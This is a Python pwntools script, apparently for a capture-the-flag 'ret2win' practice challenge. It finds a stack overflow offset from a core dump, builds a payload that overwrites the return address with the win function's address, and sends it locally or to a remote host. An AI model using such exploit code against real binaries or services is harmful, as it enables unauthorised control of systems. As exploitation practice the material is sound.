#!/bin/env python3

import argparse
import os
from pwn import *

# PARSING
parser = argparse.ArgumentParser(
	description="AK some binary"
)

parser.add_argument("-t", "--target",
	help="choose the binary to target",
	type=str,
	required=True
)

parser.add_argument("-r", "--remote",
	help="should run localy or remotly",
	default=False,
	type=bool,
	required=False
)

parser.add_argument("-g", "--gdb",
	help="should run gdb with pwn tool",
	action="store_true",
	required=False
)

args = parser.parse_args()

if args.remote:
	parser.add_argument("-H", "--host",
		help="host for the remote connection",
		type=str,
		required=True
	)

	parser.add_argument("-p", "--port",
		help="port for the remote connection",
		type=int,
		required=True
	)

args = parser.parse_args()

ELF_LOADED = ELF(args.target)
ROP_LOADED = ROP(ELF_LOADED)
PAYLOAD = []

if ELF_LOADED.arch == "amd64":
	padding_movaps = 1
	offset_to_add = 0
	base_pointer = "rbp"
	pack_function = p64
else:
	padding_movaps = 0
	offset_to_add = 4
	base_pointer = "ebp"
	pack_function = p32

if args.remote:
	PROC = remote(args.host, args.port)
else:
	PROC = ELF_LOADED.process()
	if args.gdb:
		gdb.attach(PROC.pid, """
			b * main
			c
			""", api=True)

# def get_register_value(reg, cyclic_len):
# 	GDB_PROC = gdb.debug(args.target, "c", api=True)
# 	GDB_PROC.sendline(cyclic(cyclic_len))
# 	# sleep(1)
# 	reg_gdb = GDB_PROC.gdb.newest_frame().read_register(reg)
# 	value_str = binascii.unhexlify(str(hex(reg_gdb))[2:])
# 	log.info("rbp pattern : " + str(value_str))
# 	return cyclic_find(value_str) + len(value_str) + offset_to_add - 1

# offset = get_register_value(base_pointer, 128)

def from_addr_to_str(addr):
	return (binascii.unhexlify(str(hex(addr))[2:]))

PROC_CYCLIC = ELF_LOADED.process()
PROC_CYCLIC.sendline(cyclic(128))
PROC_CYCLIC.wait_for_close()
CORE_DUMP = PROC_CYCLIC.corefile

log.warn("removing core dump (" + CORE_DUMP.path + ")")
os.remove(CORE_DUMP.path)

offset = cyclic_find(CORE_DUMP.registers[base_pointer])
offset += len(from_addr_to_str(CORE_DUMP.registers[base_pointer]))

if offset is -1:
	log.failed("offset not found.")
else:
	log.success("offset found : " + str(offset))

win_sym = ELF_LOADED.symbols[b'ret2win'] + padding_movaps

offset = b'A' * offset

PAYLOAD = offset + pack_function(win_sym)

log.info("payload: " + PAYLOAD.decode('latin1') + "\n\n")

PROC.sendline(PAYLOAD)

PROC.clean_and_log()

PROC.interactive()
